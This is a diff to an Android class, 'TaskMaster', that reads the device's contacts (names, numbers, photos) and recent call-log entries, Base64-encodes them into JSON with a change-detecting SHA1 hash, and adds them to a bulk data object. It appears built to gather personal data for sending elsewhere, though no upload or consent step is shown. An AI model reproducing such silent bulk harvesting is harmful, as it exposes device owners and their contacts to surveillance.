@@ -188,10 +188,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 List<String> numbers = new ArrayList<>();
                 JSONObject contacts = new JSONObject();
                 JSONArray informationArray = new JSONArray();
-                String shaString;
+                String shaString = "";
                 Boolean flag = false;
                 while (cursor.moveToNext()) {
-                    shaString = "";
                     String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                     if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
                             Contacts.HAS_PHONE_NUMBER)) > 0) {
@@ -214,15 +213,19 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                             photo = BitmapFactory.decodeStream(inputStream);
                         }
                         cursorInfo.moveToFirst();
-                        shaString += cursor.getString(cursor
-                                .getColumnIndex(ContactsContract.
-                                Contacts.DISPLAY_NAME));
-                        shaString += cursorInfo.getString(cursorInfo.
-                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        shaString += BitmapJsonHelper.getStringFromBitmap(photo);
+                        if (!numbers.contains(cursorInfo.getString(cursorInfo.
+                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                                .trim())) {
+                            numbers.add(cursorInfo.getString(cursorInfo.
+                                    getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                                    .trim());
+                            shaString += cursor.getString(cursor
+                                    .getColumnIndex(ContactsContract.
+                                            Contacts.DISPLAY_NAME));
+                            shaString += cursorInfo.getString(cursorInfo.
+                                    getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            shaString += BitmapJsonHelper.getStringFromBitmap(photo);
 
-                        if(flag)
-                        {
                             JSONObject information = new JSONObject();
                             information.put("Name", Base64.encodeToString(
                                     cursor.getString(cursor
@@ -240,32 +243,15 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                                     .getStringFromBitmap(photo));
                             informationArray.put(information);
                         }
-
-                        if (!hash.equals("0") && SHA1Helper.SHA1(shaString).equals(hash)) {
-                            flag = true;
-                        }
-
-                        if (hash.equals("0")) {
-                            JSONObject information = new JSONObject();
-                            information.put("Name", Base64.encodeToString(
-                                    cursor.getString(cursor
-                                            .getColumnIndex(ContactsContract.
-                                                    Contacts.DISPLAY_NAME)).getBytes(),
-                                    Base64.URL_SAFE
-                            ));
-                            information.put("Number", Base64.encodeToString(
-                                    cursorInfo.getString(cursorInfo.
-                                            getColumnIndex(ContactsContract
-                                                    .CommonDataKinds.Phone.NUMBER)).getBytes(),
-                                    Base64.URL_SAFE
-                            ));
-                            information.put("Picture", BitmapJsonHelper
-                                    .getStringFromBitmap(photo));
-                            informationArray.put(information);
-                        }
-
                         cursorInfo.close();
                     }
+                }
+                contacts.put("ContactList", informationArray);
+                if (!SHA1Helper.SHA1(shaString).equals(hash)) {
+                    contacts.put("Hash",
+                            Base64.encodeToString(SHA1Helper.SHA1(shaString).getBytes(),
+                                    Base64.URL_SAFE));
+                    bulkData.put("Contacts", contacts);
                 }
                 cursor.close();
             }
@@ -291,7 +277,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 boolean flag = false;
                 int counter = 5;
                 while (managedCursor.moveToNext() && counter != 0) {
-                    shaString = "";
                     shaString += managedCursor.getString(number);
                     Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
                     shaString += cal.toString();
@@ -299,41 +284,19 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     String callType = managedCursor.getString(type);
                     shaString += getCallType(callType);
 
-                    if (flag) {
-                        JSONObject information = new JSONObject();
-                        information.put("Number",
-                                Base64.encodeToString(managedCursor.getString(number).getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Date",
-                                Base64.encodeToString(cal.toString().getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Duration",
-                                Base64.encodeToString(managedCursor.getString(duration).getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Direction",
-                                Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
-                        informationArray.put(information);
-                    }
-
-                    if (!hash.equals("0") && SHA1Helper.SHA1(shaString).equals(hash)) {
-                        flag = true;
-                    }
-
-                    if (hash.equals("0")) {
-                        JSONObject information = new JSONObject();
-                        information.put("Number",
-                                Base64.encodeToString(managedCursor.getString(number).getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Date",
-                                Base64.encodeToString(cal.toString().getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Duration",
-                                Base64.encodeToString(managedCursor.getString(duration).getBytes(),
-                                        Base64.URL_SAFE));
-                        information.put("Direction",
-                                Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
-                        informationArray.put(information);
-                    }
+                    JSONObject information = new JSONObject();
+                    information.put("Number",
+                            Base64.encodeToString(managedCursor.getString(number).getBytes(),
+                                    Base64.URL_SAFE));
+                    information.put("Date",
+                            Base64.encodeToString(cal.toString().getBytes(),
+                                    Base64.URL_SAFE));
+                    information.put("Duration",
+                            Base64.encodeToString(managedCursor.getString(duration).getBytes(),
+                                    Base64.URL_SAFE));
+                    information.put("Direction",
+                            Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
+                    informationArray.put(information);
                     counter--;
                 }
                 managedCursor.close();
